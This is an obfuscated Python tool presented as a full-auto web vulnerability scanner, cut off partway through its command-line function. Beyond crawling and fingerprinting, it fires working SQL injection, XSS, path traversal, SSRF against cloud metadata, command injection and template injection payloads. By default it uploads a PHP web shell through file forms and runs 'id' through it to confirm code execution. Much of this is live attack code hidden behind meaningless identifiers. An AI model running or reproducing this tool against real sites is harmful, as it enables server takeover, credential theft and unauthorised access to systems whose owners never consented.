# shlhom — Web Vulnerability Scanner
# by @yy22ff
import os as shlhom0, sys as shlhom1, re as shlhom2, json as shlhom3, time as shlhom4, ssl as shlhom5, socket as shlhom6, random as shlhom7, argparse as shlhom8, subprocess as shlhom9
import urllib.parse as shlhom10
from datetime import datetime as shlhom11
from concurrent.futures import ThreadPoolExecutor as shlhom12, as_completed as shlhom13
from threading import Lock as shlhom14

try:
    import requests as shlhom15
    try:
        shlhom15.packages.urllib3.disable_warnings()
    except Exception:
        pass
except ImportError:
    print("[*] requests missing, installing...")
    try:
        shlhom9.check_call([shlhom1.executable, "-m", "pip", "install", "requests", "-q"])
        import requests as shlhom15
        shlhom15.packages.urllib3.disable_warnings()
    except Exception as shlhom16:
        print(f"[!] install failed: {shlhom16}")
        shlhom1.exit(1)

try:
    from colorama import init as shlhom17
    shlhom17()
except Exception:
    pass

class shlhom18:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
    M="\033[95m"; Cy="\033[96m"; W="\033[97m"; D="\033[90m"
    X="\033[0m"; Bo="\033[1m"
    @staticmethod
    def c(shlhom19, shlhom20): return f"{shlhom19}{shlhom20}{shlhom18.X}"




class shlhom22:
    def __init__(shlhom23, shlhom24):
        shlhom25 = shlhom11.now().strftime("%Y%m%d_%H%M%S")
        shlhom26 = shlhom10.urlparse(shlhom24).netloc.replace(":", "_") or "target"
        shlhom27 = shlhom0.path.dirname(shlhom0.path.abspath(__file__))
        shlhom23.dir = shlhom0.path.join(shlhom27, "results", f"{shlhom26}_{shlhom25}")
        shlhom0.makedirs(shlhom23.dir, exist_ok=True)
        shlhom23.f = shlhom0.path.join(shlhom23.dir, "findings.txt")
        shlhom23.raw = shlhom0.path.join(shlhom23.dir, "raw.log")
        shlhom23.lock = shlhom14()
        shlhom23.n = 0

    def _w(shlhom23, shlhom28, shlhom29, shlhom30):
        shlhom31 = f"[{shlhom28}] {shlhom29}"
        print(shlhom18.c(shlhom30, shlhom31))
        with shlhom23.lock:
            with open(shlhom23.f, "a", encoding="utf-8") as shlhom32:
                shlhom32.write(shlhom31 + "\n")
            shlhom23.n += 1

    def info(shlhom23, shlhom29): shlhom23._w("*", shlhom29, shlhom18.Cy)
    def ok(shlhom23, shlhom29):   shlhom23._w("+", shlhom29, shlhom18.G)
    def vuln(shlhom23, shlhom29): shlhom23._w("!", shlhom29, shlhom18.R)
    def warn(shlhom23, shlhom29): shlhom23._w("~", shlhom29, shlhom18.Y)

    def dbg(shlhom23, shlhom29):
        with shlhom23.lock:
            with open(shlhom23.raw, "a", encoding="utf-8") as shlhom32:
                shlhom32.write(shlhom29 + "\n")

    def save(shlhom23, shlhom33, shlhom34, shlhom35="w"):
        shlhom36 = shlhom0.path.join(shlhom23.dir, shlhom33)
        if isinstance(shlhom34, bytes):
            with open(shlhom36, "wb") as shlhom32: shlhom32.write(shlhom34)
        else:
            with open(shlhom36, shlhom35, encoding="utf-8") as shlhom32: shlhom32.write(shlhom34)
        return shlhom36

shlhom37 = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
]

class shlhom38:
    def __init__(shlhom39, shlhom40=10, shlhom41=0.0, shlhom42=None):
        shlhom39.s = shlhom15.Session()
        shlhom39.s.headers["User-Agent"] = shlhom7.choice(shlhom37)
        shlhom39.s.headers["Accept"] = "*/*"
        shlhom39.s.verify = False
        shlhom39.t = shlhom40; shlhom39.d = shlhom41
        shlhom39.p = {"http": shlhom42, "https": shlhom42} if shlhom42 else None

    def req(shlhom39, shlhom43, shlhom44, **shlhom45):
        if shlhom39.d: shlhom4.sleep(shlhom39.d)
        try:
            return shlhom39.s.request(shlhom43, shlhom44, timeout=shlhom39.t, proxies=shlhom39.p,
                                  allow_redirects=True, **shlhom45)
        except Exception as shlhom16:
            return None

    def get(shlhom39, shlhom46, **shlhom45):  return shlhom39.req("GET",  shlhom46, **shlhom45)
    def post(shlhom39, shlhom46, **shlhom45): return shlhom39.req("POST", shlhom46, **shlhom45)


shlhom47 = shlhom2.compile(r'(?:href|src|action)\s*=\s*["\']([^"\']+)', shlhom2.I)
shlhom48 = shlhom2.compile(r'<form\b([^>]*)>(.*?)</form>', shlhom2.I | shlhom2.S)
shlhom49 = shlhom2.compile(r'<(?:input|textarea|select)\b[^>]*>', shlhom2.I)
shlhom50 = shlhom2.compile(r'action\s*=\s*["\']([^"\']*)', shlhom2.I)
shlhom51 = shlhom2.compile(r'method\s*=\s*["\']([^"\']*)', shlhom2.I)
shlhom52 = shlhom2.compile(r'name\s*=\s*["\']([^"\']+)', shlhom2.I)
shlhom53 = shlhom2.compile(r'type\s*=\s*["\']([^"\']*)', shlhom2.I)
shlhom54 = shlhom2.compile(r'[?&]([^=&#]+)=([^&#]*)')

def shlhom55(shlhom44, shlhom56, shlhom57):
    shlhom58 = shlhom10.urlparse(shlhom44)
    shlhom59 = shlhom10.parse_qs(shlhom58.query, keep_blank_values=True)
    shlhom59[shlhom56] = [shlhom57]
    shlhom60 = shlhom10.urlencode(shlhom59, doseq=True)
    return shlhom10.urlunparse((shlhom58.scheme, shlhom58.netloc, shlhom58.path, shlhom58.params, shlhom60, shlhom58.fragment))

def shlhom61(shlhom62, shlhom63, shlhom57, shlhom64=None):
    shlhom65 = {}
    for shlhom66, shlhom67 in shlhom62["fields"]:
        shlhom65[shlhom66] = shlhom57 if shlhom66 == shlhom63 else "test"
    if shlhom64: shlhom65.update(shlhom64)
    return shlhom65

def shlhom68(shlhom44):
    """fingerprint base url for dedupe"""
    shlhom69 = shlhom10.urlparse(shlhom44)
    shlhom70 = sorted(shlhom10.parse_qsl(shlhom69.query))
    return shlhom10.urlunparse((shlhom69.scheme, shlhom69.netloc, shlhom69.path, shlhom69.params, shlhom10.urlencode(shlhom70), ""))

def shlhom71(shlhom72, shlhom73, shlhom74=2, shlhom75=300, shlhom76=None):
    if shlhom76: shlhom76.info("crawling...")
    shlhom77 = shlhom10.urlparse(shlhom72).netloc
    shlhom78 = set(); shlhom79 = [(shlhom72, 0)]
    shlhom80 = set(); shlhom81 = []; shlhom82 = set()

    while shlhom79 and len(shlhom78) < shlhom75:
        shlhom46, shlhom83 = shlhom79.pop(0)
        if shlhom46 in shlhom78 or shlhom83 > shlhom74: continue
        shlhom78.add(shlhom46)
        shlhom84 = shlhom73.get(shlhom46)
        if not shlhom84: continue
        shlhom80.add(shlhom46)

        for shlhom85, _ in shlhom54.findall(shlhom46):
            shlhom82.add((shlhom46, shlhom85))

        shlhom86 = shlhom84.headers.get("Content-Type", "").lower()
        if "html" not in shlhom86 and "xml" not in shlhom86: continue

        shlhom87 = shlhom84.text[:800000]

        for shlhom88 in shlhom47.findall(shlhom87):
            shlhom89 = shlhom10.urljoin(shlhom46, shlhom88)
            if shlhom10.urlparse(shlhom89).scheme not in ("http", "https"): continue
            if shlhom10.urlparse(shlhom89).netloc != shlhom77: continue
            shlhom89 = shlhom89.split("#")[0]
            if shlhom89 not in shlhom78:
                shlhom79.append((shlhom89, shlhom83 + 1))

        for shlhom90, shlhom91 in shlhom48.findall(shlhom87):
            shlhom92 = shlhom50.search(shlhom90)
            shlhom93 = shlhom51.search(shlhom90)
            shlhom94 = shlhom10.urljoin(shlhom46, shlhom92.group(1)) if shlhom92 else shlhom46
            shlhom95 = (shlhom93.group(1) or "get").lower() if shlhom93 else "get"
            shlhom96 = []
            for shlhom97 in shlhom49.findall(shlhom91):
                shlhom98 = shlhom52.search(shlhom97)
                if not shlhom98: continue
                shlhom99 = shlhom53.search(shlhom97)
                shlhom100 = (shlhom99.group(1) or "text").lower() if shlhom99 else "text"
                shlhom96.append((shlhom98.group(1), shlhom100))
            if shlhom96:
                shlhom81.append({"action": shlhom94, "method": shlhom95,
                              "fields": shlhom96, "page": shlhom46})

    if shlhom76: shlhom76.ok(f"crawl: {len(shlhom80)} urls / {len(shlhom82)} params / {len(shlhom81)} forms")
    return list(shlhom80), shlhom81, list(shlhom82)


shlhom101 = {
    "WordPress": [r"wp-content", r"wp-includes", r"wp-json"],
    "Drupal":    [r"Drupal\.settings", r"sites/default/files", r"X-Generator: Drupal"],
    "Joomla":    [r"/media/system/js/", r"X-Content-Encoded-By: Joomla"],
    "Laravel":   [r"laravel", r"XSRF-TOKEN", r"laravel_session"],
    "Django":    [r"csrfmiddlewaretoken", r"__admin_media_prefix__"],
    "Rails":     [r"csrf-token", r"X-Runtime", r"_rails_session"],
    "Express":   [r"X-Powered-By: Express"],
    "PHP":       [r"X-Powered-By: PHP", r"PHPSESSID", r"\.php"],
    "ASP.NET":   [r"X-AspNet-Version", r"ASP\.NET_SessionId"],
    "Spring":    [r"JSESSIONID", r"Whitelabel Error"],
    "Nginx":     [r"Server: nginx"],
    "Apache":    [r"Server: Apache"],
    "IIS":       [r"Server: Microsoft-IIS"],
    "Cloudflare": [r"Server: cloudflare", r"cf-ray"],
    "Nextcloud": [r"nextcloud", r"__Host-nc_sameSite"],
}

def shlhom102(shlhom73, shlhom46, shlhom76):
    shlhom84 = shlhom73.get(shlhom46)
    if not shlhom84: return
    shlhom103 = str(shlhom84.headers) + "\n" + shlhom84.text[:200000]
    shlhom104 = []
    for shlhom105, shlhom106 in shlhom101.items():
        for shlhom107 in shlhom106:
            if shlhom2.search(shlhom107, shlhom103, shlhom2.I):
                shlhom104.append(shlhom105); break
    if shlhom104: shlhom76.ok(f"tech: {', '.join(shlhom104)}")
    else:    shlhom76.warn("tech: unknown")

shlhom108 = {
    "Cloudflare": [r"cf-ray", r"cloudflare"],
    "AWS WAF":    [r"x-amz-cf", r"awselb"],
    "Sucuri":     [r"x-sucuri", r"sucuri"],
    "Akamai":     [r"akamai"],
    "Imperva":    [r"incap_ses", r"visid_incap"],
    "F5 BIG-IP":  [r"bigip", r"X-WA-Info"],
    "ModSecurity":[r"mod_security", r"modsecurity"],
    "FortiWeb":   [r"fortiweb"],
}

def shlhom109(shlhom73, shlhom46, shlhom76):
    shlhom84 = shlhom73.get(shlhom46)
    if not shlhom84: return
    shlhom103 = str(shlhom84.headers).lower() + "\n" + shlhom84.text[:50000].lower()
    shlhom104 = [shlhom105 for shlhom105, shlhom110 in shlhom108.items() if any(shlhom2.search(shlhom107, shlhom103) for shlhom107 in shlhom110)]
    if shlhom104: shlhom76.warn(f"waf: {', '.join(shlhom104)}")
    else:    shlhom76.info("waf: none detected")

shlhom111 = ["Strict-Transport-Security", "Content-Security-Policy",
         "X-Frame-Options", "X-Content-Type-Options",
         "Referrer-Policy", "Permissions-Policy"]

def shlhom112(shlhom73, shlhom46, shlhom76):
    shlhom84 = shlhom73.get(shlhom46)
    if not shlhom84: return
    shlhom113 = [shlhom114 for shlhom114 in shlhom111 if shlhom114 not in shlhom84.headers]
    if shlhom113:
        shlhom76.warn(f"missing headers: {', '.join(shlhom113)}")
    else:
        shlhom76.ok("all security headers present")


def shlhom115(shlhom73, shlhom46, shlhom76):
    shlhom84 = shlhom73.get(shlhom46, headers={"Origin": "https://evil.test"})
    if not shlhom84: return
    shlhom116 = shlhom84.headers.get("Access-Control-Allow-Origin", "")
    shlhom117 = shlhom84.headers.get("Access-Control-Allow-Credentials", "").lower()
    if shlhom116 == "*" and shlhom117 == "true":
        shlhom76.vuln(f"CORS: * with credentials on {shlhom46}")
    elif "evil.test" in shlhom116:
        shlhom76.vuln(f"CORS: reflects origin on {shlhom46}")

shlhom118 = [
    ".git/config", ".git/HEAD", ".env", ".env.bak", ".env.old",
    "config.php.bak", "config.php~", "config.php.old",
    "backup.zip", "backup.tar.gz", "backup.sql", "db.sql", "dump.sql",
    "phpinfo.php", "info.php", "test.php", "server-status",
    "web.config", "composer.json", "composer.lock",
    "package.json", "Dockerfile", ".DS_Store", ".htaccess",
    "README.md", "CHANGELOG.md", "sitemap.xml", "robots.txt",
    ".svn/entries", "wp-config.php.bak", "config.yml", "config.json",
]
shlhom119 = ["root:x:0:0:", "DB_PASSWORD", "APP_KEY", "<?php",
              "[extensions]", "gitdir:", "ref: refs/heads", "SECRET",
              "composer.json", "\"name\":"]

def shlhom120(shlhom73, shlhom46, shlhom76):
    shlhom121 = shlhom46.rstrip("/")
    shlhom122 = []
    for shlhom123 in shlhom118:
        shlhom124 = f"{shlhom121}/{shlhom123}"
        shlhom84 = shlhom73.get(shlhom124)
        if not shlhom84 or shlhom84.status_code != 200: continue
        if len(shlhom84.text) < 20: continue
        shlhom103 = shlhom84.text[:5000]
        if any(shlhom125 in shlhom103 for shlhom125 in shlhom119) or shlhom123 in ("robots.txt","sitemap.xml",".htaccess"):
            shlhom76.vuln(f"FILE: {shlhom124}")
            shlhom122.append(shlhom124)
    return shlhom122


shlhom126 = ["admin", "admin/", "admin.php", "admin/login", "admin/login.php",
         "wp-admin/", "wp-login.php", "administrator/", "login", "login.php",
         "panel", "cpanel", "phpmyadmin/", "manager/html", "adminer.php",
         "user/login", "auth/login", "dashboard"]

def shlhom127(shlhom73, shlhom46, shlhom76):
    shlhom121 = shlhom46.rstrip("/")
    shlhom122 = []
    for shlhom128 in shlhom126:
        shlhom124 = f"{shlhom121}/{shlhom128}"
        shlhom84 = shlhom73.get(shlhom124)
        if not shlhom84: continue
        if shlhom84.status_code == 200:
            shlhom129 = shlhom84.text[:3000].lower()
            if any(shlhom130 in shlhom129 for shlhom130 in ("login", "password", "username", "admin")):
                shlhom76.ok(f"ADMIN: {shlhom124}")
                shlhom122.append(shlhom124)
    return shlhom122


def shlhom131(shlhom73, shlhom46, shlhom56, shlhom132, shlhom133):
    shlhom124 = shlhom55(shlhom46, shlhom56, shlhom132)
    shlhom84 = shlhom73.get(shlhom124)
    if shlhom84: shlhom133(shlhom124, shlhom84)

def shlhom134(shlhom73, shlhom62, shlhom63, shlhom132, shlhom133):
    shlhom135 = shlhom61(shlhom62, shlhom63, shlhom132)
    if shlhom62["method"] == "post":
        shlhom84 = shlhom73.post(shlhom62["action"], data=shlhom135)
    else:
        shlhom84 = shlhom73.get(shlhom62["action"], params=shlhom135)
    if shlhom84: shlhom133(shlhom62["action"] + " [form:" + shlhom63 + "]", shlhom84)

shlhom136 = [
    r"you have an error in your sql syntax",
    r"mysql_fetch", r"mysql_num_rows", r"mysql_query",
    r"supplied argument is not a valid mysql",
    r"ora-\d{4,5}", r"oracle.*error",
    r"postgresql.*error", r"pg_query", r"pg_exec",
    r"sqlite.*error", r"sqlite3::",
    r"unclosed quotation mark", r"quoted string not properly terminated",
    r"sqlstate\[", r"syntax error at or near",
    r"warning.*mysql", r"odbc_exec",
]
shlhom137 = ["'", "\"", "')", "\"))", "1'", "1\"", "' OR '1'='1", "1 AND 1=2", "';--"]
shlhom138 = ["' AND SLEEP(4)-- -", "' AND (SELECT 1 FROM PG_SLEEP(4))-- -",
          "'; WAITFOR DELAY '0:0:4'-- -"]

def shlhom139(shlhom73, shlhom80, shlhom82, shlhom81, shlhom76):
    shlhom140 = []
    shlhom141 = shlhom82[:40]
    for shlhom46, shlhom85 in shlhom141:
        for shlhom107 in shlhom137:
            def shlhom133(shlhom124, shlhom84):
                shlhom142 = shlhom84.text.lower()
                for shlhom143 in shlhom136:
                    if shlhom2.search(shlhom143, shlhom142):
                        shlhom76.vuln(f"SQLi(err) {shlhom124}")
                        shlhom140.append(("sqli-error", shlhom124)); return
            shlhom131(shlhom73, shlhom46, shlhom85, shlhom107, shlhom133)
    for shlhom46, shlhom85 in shlhom141[:15]:
        for shlhom107 in shlhom138:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom144 = shlhom4.time(); shlhom84 = shlhom73.get(shlhom124); shlhom145 = shlhom4.time() - shlhom144
            if shlhom84 and shlhom145 >= 3.8:
                shlhom76.vuln(f"SQLi(time {shlhom145:.1f}s) {shlhom124}")
                shlhom140.append(("sqli-time", shlhom124))
    return shlhom140


shlhom146 = ["<script>alert(1)</script>",
         "\"><script>alert(1)</script>",
         "'><svg onload=alert(1)>",
         "<img src=x onerror=alert(1)>"]

def shlhom147(shlhom73, shlhom80, shlhom82, shlhom81, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:40]:
        for shlhom107 in shlhom146:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom84 = shlhom73.get(shlhom124)
            if shlhom84 and shlhom107 in shlhom84.text:
                shlhom76.vuln(f"XSS(reflect) {shlhom124}")
                shlhom140.append(("xss", shlhom124)); break
    for shlhom62 in shlhom81[:20]:
        for shlhom66, shlhom67 in shlhom62["fields"]:
            if shlhom67 in ("file", "submit", "button", "hidden"): continue
            for shlhom107 in shlhom146[:2]:
                shlhom135 = shlhom61(shlhom62, shlhom66, shlhom107)
                shlhom84 = (shlhom73.post(shlhom62["action"], data=shlhom135) if shlhom62["method"] == "post"
                     else shlhom73.get(shlhom62["action"], params=shlhom135))
                if shlhom84 and shlhom107 in shlhom84.text:
                    shlhom76.vuln(f"XSS(form:{shlhom66}) {shlhom62['action']}")
                    shlhom140.append(("xss-form", shlhom62["action"] + "#" + shlhom66)); break
    return shlhom140


shlhom148 = ["../../../../etc/passwd", "....//....//....//etc/passwd",
         "..%2f..%2f..%2f..%2fetc/passwd", "/etc/passwd",
         "..\\..\\..\\..\\windows\\win.ini"]
shlhom149 = ["root:x:0:0:", "root:*:", "daemon:x:", "[extensions]", "[fonts]", "[mci extensions]"]

def shlhom150(shlhom73, shlhom80, shlhom82, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:40]:
        for shlhom107 in shlhom148:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom84 = shlhom73.get(shlhom124)
            if shlhom84 and any(shlhom125 in shlhom84.text for shlhom125 in shlhom149):
                shlhom76.vuln(f"LFI {shlhom124}")
                shlhom140.append(("lfi", shlhom124)); break
    return shlhom140

shlhom151 = ["http://example.com/", "https://example.com/"]
shlhom152 = ["Example Domain", "example.com"]

def shlhom153(shlhom73, shlhom80, shlhom82, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:40]:
        for shlhom107 in shlhom151:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom84 = shlhom73.get(shlhom124)
            if shlhom84 and any(shlhom125 in shlhom84.text for shlhom125 in shlhom152):
                shlhom76.vuln(f"RFI {shlhom124}")
                shlhom140.append(("rfi", shlhom124)); break
    return shlhom140


shlhom154 = ["http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/",
          "http://[::1]:80/", "http://localhost:80/"]
shlhom155 = ["ami-id", "instance-id", "iam/security-credentials",
          "root:x:0:0:", "Welcome to nginx", "Apache2 Default Page"]

def shlhom156(shlhom73, shlhom80, shlhom82, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:30]:
        for shlhom107 in shlhom154:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom84 = shlhom73.get(shlhom124)
            if shlhom84 and any(shlhom125 in shlhom84.text for shlhom125 in shlhom155):
                shlhom76.vuln(f"SSRF {shlhom124}")
                shlhom140.append(("ssrf", shlhom124)); break
    return shlhom140


shlhom157 = ["; sleep 4", "| sleep 4", "`sleep 4`", "$(sleep 4)", "& sleep 4",
          "|| sleep 4", "&& sleep 4", "| ping -c 4 127.0.0.1"]

def shlhom158(shlhom73, shlhom80, shlhom82, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:30]:
        for shlhom107 in shlhom157:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom144 = shlhom4.time(); shlhom84 = shlhom73.get(shlhom124); shlhom145 = shlhom4.time() - shlhom144
            if shlhom84 and shlhom145 >= 3.5:
                shlhom76.vuln(f"CMDi(time {shlhom145:.1f}s) {shlhom124}")
                shlhom140.append(("cmdi", shlhom124)); break
    return shlhom140


shlhom159 = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("*{7*7}", "49"),
]

def shlhom160(shlhom73, shlhom80, shlhom82, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:40]:
        for shlhom107, shlhom161 in shlhom159:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom84 = shlhom73.get(shlhom124)
            if shlhom84 and shlhom161 in shlhom84.text and shlhom107 not in shlhom84.text:
                shlhom76.vuln(f"SSTI [{shlhom107}->{shlhom161}] {shlhom124}")
                shlhom140.append(("ssti", shlhom124)); break
    return shlhom140

shlhom162 = ["http://evil.test", "//evil.test", "https://evil.test"]
shlhom163 = ["evil.test", "Location: http://evil.test", "Location: https://evil.test"]

def shlhom164(shlhom73, shlhom80, shlhom82, shlhom76):
    shlhom140 = []
    for shlhom46, shlhom85 in shlhom82[:40]:
        for shlhom107 in shlhom162:
            shlhom124 = shlhom55(shlhom46, shlhom85, shlhom107)
            shlhom84 = shlhom73.get(shlhom124)
            if not shlhom84: continue
            shlhom165 = shlhom84.headers.get("Location", "")
            if "evil.test" in shlhom165:
                shlhom76.vuln(f"REDIRECT {shlhom124} -> {shlhom165}")
                shlhom140.append(("redirect", shlhom124)); break
            if "evil.test" in shlhom84.text and "redirect" in shlhom84.text.lower():
                shlhom76.vuln(f"REDIRECT(body) {shlhom124}")
                shlhom140.append(("redirect-body", shlhom124)); break
    return shlhom140

shlhom166 = (
    b"<?php\n"
    b"echo 'WSCAN_OK';\n"
    b"if(isset($_GET['c'])){system($_GET['c']);}\n"
    b"?>\n"
)

shlhom167 = ["", "uploads/", "upload/", "files/", "media/",
                     "images/", "upload/files/", "tmp/", "assets/"]

def shlhom168(shlhom73, shlhom81, shlhom76):
    shlhom140 = []
    for shlhom62 in shlhom81:
        shlhom169 = [shlhom66 for shlhom66, shlhom67 in shlhom62["fields"] if shlhom67 == "file"]
        if not shlhom169: continue
        shlhom76.info(f"upload form: {shlhom62['action']}")
        for shlhom170 in shlhom169:
            shlhom171 = {shlhom170: ("wscan.php", shlhom166, "application/x-php")}
            shlhom135 = {shlhom66: "x" for shlhom66, shlhom67 in shlhom62["fields"] if shlhom67 != "file"}
            try:
                shlhom84 = shlhom73.post(shlhom62["action"], data=shlhom135, files=shlhom171)
            except Exception as shlhom16:
                shlhom76.dbg(f"upload err {shlhom16}"); continue
            if not shlhom84: continue

            shlhom172 = []
            for shlhom173 in [r'(?:href|src|url)["\']?[=:]\s*["\']?([^\s"\'<>]+\.php)',
                        r'(/\S+\.php)', r'(https?://\S+\.php)']:
                for shlhom174 in shlhom2.findall(shlhom173, shlhom84.text):
                    shlhom172.append(shlhom10.urljoin(shlhom62["action"], shlhom174))
            shlhom121 = shlhom10.urlparse(shlhom62["action"])
            shlhom175 = f"{shlhom121.scheme}://{shlhom121.netloc}"
            for shlhom176 in shlhom167:
                shlhom172.append(f"{shlhom175}/{shlhom176}wscan.php")
                shlhom172.append(f"{shlhom175}/{shlhom176}shell.php")
            shlhom172 = list(dict.fromkeys(shlhom172))[:25]

            shlhom177 = None
            for shlhom124 in shlhom172:
                shlhom178 = shlhom73.get(shlhom124)
                if shlhom178 and "WSCAN_OK" in shlhom178.text:
                    shlhom76.vuln(f"UPLOADED SHELL: {shlhom124}")
                    shlhom179 = shlhom73.get(shlhom124 + ("&" if "?" in shlhom124 else "?") + "c=id")
                    if shlhom179 and ("uid=" in shlhom179.text or "gid=" in shlhom179.text):
                        shlhom76.ok(f"SHELL EXEC: {shlhom124}?c=id")
                        shlhom177 = (shlhom124, True)
                    else:
                        shlhom177 = (shlhom124, False)
                    break
            if shlhom177:
                shlhom140.append(("shell", shlhom177[0], shlhom177[1]))
                break
    return shlhom140


def shlhom180(shlhom181, shlhom182, shlhom76):
    shlhom183 = shlhom5.create_default_context()
    shlhom183.check_hostname = False
    shlhom183.verify_mode = shlhom5.CERT_NONE
    try:
        with shlhom6.create_connection((shlhom181, shlhom182), timeout=5) as shlhom184:
            with shlhom183.wrap_socket(shlhom184, server_hostname=shlhom181) as shlhom185:
                shlhom186 = shlhom185.version()
                shlhom187 = shlhom185.cipher()
                shlhom76.info(f"SSL: {shlhom186} {shlhom187[0] if shlhom187 else ''}")
                if shlhom186 in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                    shlhom76.vuln(f"SSL weak: {shlhom186}")
    except Exception as shlhom16:
        shlhom76.dbg(f"ssl err {shlhom16}")


def scan(url, depth=2, threads=8, timeout=10, delay=0.0, proxy=None,
         no_shell=False, verbose=True):
    """
    Scan a target URL for web vulnerabilities.

    Args:
        url: Target URL (http:// or https://)
        depth: Crawl depth (default 2)
        threads: Parallel workers (default 8)
        timeout: Request timeout in seconds (default 10)
        delay: Delay between requests (default 0.0)
        proxy: HTTP/SOCKS proxy (default None)
        no_shell: Skip file upload exploitation (default False)
        verbose: Print findings to console (default True)

    Returns:
        dict with keys: target, findings, summary, output_dir, duration
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/")

    scan_start = shlhom4.time()
    shlhom76 = shlhom22(url)
    shlhom73 = shlhom38(timeout, delay, proxy)

    shlhom76.info(f"target: {url}")
    shlhom76.info(f"output: {shlhom76.dir}")
    shlhom76.info(f"time:   {shlhom11.now().strftime('%Y-%m-%d %H:%M:%S')}")


    shlhom76.save("shell.php", shlhom166)

    shlhom191 = []

    try:
        # 1. Crawl
        shlhom80, shlhom81, shlhom82 = shlhom71(url, shlhom73, depth, shlhom76=shlhom76)

        # 2. Passive
        shlhom102(shlhom73, url, shlhom76)
        shlhom109(shlhom73, url, shlhom76)
        shlhom112(shlhom73, url, shlhom76)
        shlhom115(shlhom73, url, shlhom76)

        # 3. Files + admin
        shlhom191 += [("file", shlhom124) for shlhom124 in (shlhom120(shlhom73, url, shlhom76) or [])]
        shlhom191 += [("admin", shlhom124) for shlhom124 in (shlhom127(shlhom73, url, shlhom76) or [])]

        # 4. Injection (parallel)
        shlhom76.info("running injection modules...")
        shlhom192 = {
            "sqli":     lambda: shlhom139(shlhom73, shlhom80, shlhom82, shlhom81, shlhom76),
            "xss":      lambda: shlhom147(shlhom73, shlhom80, shlhom82, shlhom81, shlhom76),
            "lfi":      lambda: shlhom150(shlhom73, shlhom80, shlhom82, shlhom76),
            "rfi":      lambda: shlhom153(shlhom73, shlhom80, shlhom82, shlhom76),
            "ssrf":     lambda: shlhom156(shlhom73, shlhom80, shlhom82, shlhom76),
            "cmdi":     lambda: shlhom158(shlhom73, shlhom80, shlhom82, shlhom76),
            "ssti":     lambda: shlhom160(shlhom73, shlhom80, shlhom82, shlhom76),
            "redirect": lambda: shlhom164(shlhom73, shlhom80, shlhom82, shlhom76),
        }
        with shlhom12(max_workers=threads) as shlhom193:
            shlhom194 = {shlhom193.submit(shlhom195): shlhom196 for shlhom196, shlhom195 in shlhom192.items()}
            for shlhom197 in shlhom13(shlhom194):
                try:
                    shlhom198 = shlhom197.result() or []
                    shlhom191.extend(shlhom198)
                except Exception as shlhom16:
                    shlhom76.dbg(f"mod err {shlhom194[shlhom197]}: {shlhom16}")

        # 5. Upload -> shell
        if not no_shell and shlhom81:
            shlhom191 += shlhom168(shlhom73, shlhom81, shlhom76) or []

        # 6. SSL
        shlhom181 = shlhom10.urlparse(url).hostname
        if shlhom181 and url.startswith("https://"):
            shlhom180(shlhom181, 443, shlhom76)

    except KeyboardInterrupt:
        shlhom76.warn("interrupted by user")

    # ---- summary ----
    shlhom76.info("=" * 40)
    shlhom76.info(f"TOTAL FINDINGS: {len(shlhom191)}")
    for shlhom199 in shlhom191:
        shlhom76.ok(f"  {shlhom199}")
    shlhom76.info(f"saved: {shlhom76.dir}")

    try:
        shlhom76.save("summary.json", shlhom3.dumps(
            [{"type": shlhom199[0], "target": shlhom199[1], "extra": shlhom199[2:] if len(shlhom199) > 2 else []}
             for shlhom199 in shlhom191], indent=2, default=str))
    except Exception as shlhom16:
        shlhom76.dbg(f"json err {shlhom16}")

    duration = round(shlhom4.time() - scan_start, 2)

    if verbose:
        print(shlhom18.c(shlhom18.G, f"\n[yy22ff] Scan complete in {duration}s"))

    return {
        "target": url,
        "duration": duration,
        "findings": [
            {"type": f[0], "target": f[1], "extra": list(f[2:]) if len(f) > 2 else []}
            for f in shlhom191
        ],
        "summary": {
            "total": len(shlhom191),
            "by_type": {t: sum(1 for x in shlhom191 if x[0] == t)
                       for t in set(x[0] for x in shlhom191)},
        },
        "output_dir": shlhom76.dir,
    }


def cli():
    """Command-line interface for yy22ff scanner."""
    shlhom189 = shlhom8.ArgumentParser(
        prog="yy22ff",
        description="yy22ff — Full-Auto Web Vulnerability Scanner",
    )
    shlhom189.add_argument("-u", "--url", required=True, help="Target URL")
    shlhom189.add_argument("-d", "--depth", type=int, default=2, help="Crawl depth (default 2)")
    shlhom189.add_argument("-t", "--threads", type=int, default=8, help="Parallel workers (default 8)")
    shlhom189.add_argument("--timeout", type=int, default=10, help="Request timeout (default 10s)")
    shlhom189.add_argument("--delay", type=float, default=0.0, help="Delay between requests (default 0.0)")
    shlhom189.add_argument("--proxy", default=None, help="HTTP/SOCKS proxy")
    shlhom189.add_argument("--no-shell", action="store_true", help="Skip upload->shell stage")
    args = shlhom189.parse_args()

    try:
        result = scan(
            args.url,
            depth=args.depth,
